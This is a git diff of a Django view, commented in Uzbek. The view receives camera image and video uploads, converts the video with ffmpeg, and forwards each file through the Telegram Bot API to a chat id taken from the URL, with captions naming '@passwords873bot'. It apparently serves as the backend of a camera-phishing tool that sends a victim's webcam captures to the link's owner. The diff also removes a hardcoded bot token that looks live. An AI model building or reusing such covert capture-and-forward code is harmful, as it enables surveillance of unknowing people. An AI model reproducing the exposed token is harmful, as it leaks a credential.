@@ -9,54 +9,70 @@ from django.core.files.base import ContentFile
 from django.core.files.storage import default_storage
 from django.shortcuts import render
 
-TELEGRAM_BOT_TOKEN = "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"
-
-IMAGE_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_images')
-VIDEO_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_videos')
-os.makedirs(IMAGE_DIR, exist_ok=True)
-os.makedirs(VIDEO_DIR, exist_ok=True)
-
+TELEGRAM_BOT_TOKEN = "TOKENNI_SHU_YERGA_QOY"
 
 @csrf_exempt
 def camera_view(request, id):
 
     if request.method == "GET":
-        return render(request, "camera/index.html", {
-            'MEDIA_URL': settings.MEDIA_URL
-        })
+        return render(request, "camera/index.html")
 
-    # Agar rasm yuborilgan bo'lsa
-    if 'image' in request.FILES:
-        uploaded_file = request.FILES['image']
+    # -----------------------------
+    # 📸 RASM QABUL QILISH
+    # -----------------------------
+    if "image" in request.FILES:
+        uploaded_file = request.FILES["image"]
         ext = uploaded_file.name.split('.')[-1]
         filename = f"{id}_{uuid.uuid4()}.{ext}"
-        file_path = os.path.join(IMAGE_DIR, filename)
 
-        # Saqlash (default_storage bilan yoki bevosita yozish mumkin)
-        default_storage.save(file_path, ContentFile(uploaded_file.read()))
+        # faqat nisbiy path!!!
+        relative_path = f"saved_images/{filename}"
 
-        # Telegramga yuborish (sendPhoto)
+        # saqlash
+        default_storage.save(relative_path, ContentFile(uploaded_file.read()))
+
+        # ABSOLUTE path Telegramga yuborish uchun
+        full_path = os.path.join(settings.MEDIA_ROOT, relative_path)
+
+        # rasmni telegramga yuborish
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-            with open(file_path, "rb") as f:
+            with open(full_path, "rb") as f:
                 files = {"photo": f}
-                data = {"chat_id": id, "caption": f"Rasm 📸 \n\n@passwords873bot"}
-                r = requests.post(url, files=files, data=data, timeout=15)
-                # agar kerak bo'lsa r.status_code va r.json() bilan tekshirib yozing
+                data = {
+                    "chat_id": id,
+                    "caption": "Rasm 📸\n\n@passwords873bot"
+                }
+                requests.post(url, files=files, data=data, timeout=15)
         except Exception as e:
             print("Telegram rasm yuborishda xato:", e)
 
-        return JsonResponse({"status": "success", "type": "image", "filename": filename})
+        return JsonResponse({
+            "status": "success",
+            "type": "image",
+            "filename": filename
+        })
 
-    if 'video' in request.FILES:
-        uploaded_file = request.FILES['video']
+    # -----------------------------
+    # 🎥 VIDEO QABUL QILISH
+    # -----------------------------
+    if "video" in request.FILES:
+        uploaded_file = request.FILES["video"]
+
         webm_filename = f"{id}_{uuid.uuid4()}.webm"
-        webm_path = os.path.join(VIDEO_DIR, webm_filename)
-        default_storage.save(webm_path, ContentFile(uploaded_file.read()))
-
         mp4_filename = f"{id}_{uuid.uuid4()}.mp4"
-        mp4_path = os.path.join(VIDEO_DIR, mp4_filename)
 
+        relative_webm = f"saved_videos/{webm_filename}"
+        relative_mp4 = f"saved_videos/{mp4_filename}"
+
+        # saqlash
+        default_storage.save(relative_webm, ContentFile(uploaded_file.read()))
+
+        # absolute pathlar
+        webm_path = os.path.join(settings.MEDIA_ROOT, relative_webm)
+        mp4_path = os.path.join(settings.MEDIA_ROOT, relative_mp4)
+
+        # ffmpeg konvertatsiya
         try:
             subprocess.run([
                 "ffmpeg", "-i", webm_path,
@@ -65,20 +81,33 @@ def camera_view(request, id):
                 "-y", mp4_path
             ], check=True)
 
-            # Telegramga yuborish (sendVideo)
+            # Telegramga yuborish
             try:
                 url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                 with open(mp4_path, "rb") as f:
                     files = {"video": f}
-                    data = {"chat_id": id, "caption": f"Video 🎥 \n\n@passwords873bot"}
-                    r = requests.post(url, files=files, data=data, timeout=60)
+                    data = {
+                        "chat_id": id,
+                        "caption": "Video 🎥\n\n@passwords873bot"
+                    }
+                    requests.post(url, files=files, data=data, timeout=60)
             except Exception as e:
                 print("Telegram video yuborishda xato:", e)
 
         except Exception as e:
-            print("FFmpeg konvertatsiya xato:", e)
-            return JsonResponse({"status": "error", "message": "Video konvertatsiya xato"})
+            print("FFmpeg xato:", e)
+            return JsonResponse({
+                "status": "error",
+                "message": "FFmpeg xato"
+            })
 
-        return JsonResponse({"status": "success", "type": "video", "filename": mp4_filename})
+        return JsonResponse({
+            "status": "success",
+            "type": "video",
+            "filename": mp4_filename
+        })
 
-    return JsonResponse({"status": "error", "message": "Hech qanday fayl yuborilmadi"})
+    return JsonResponse({
+        "status": "error",
+        "message": "Hech qanday fayl yuborilmadi"
+    })
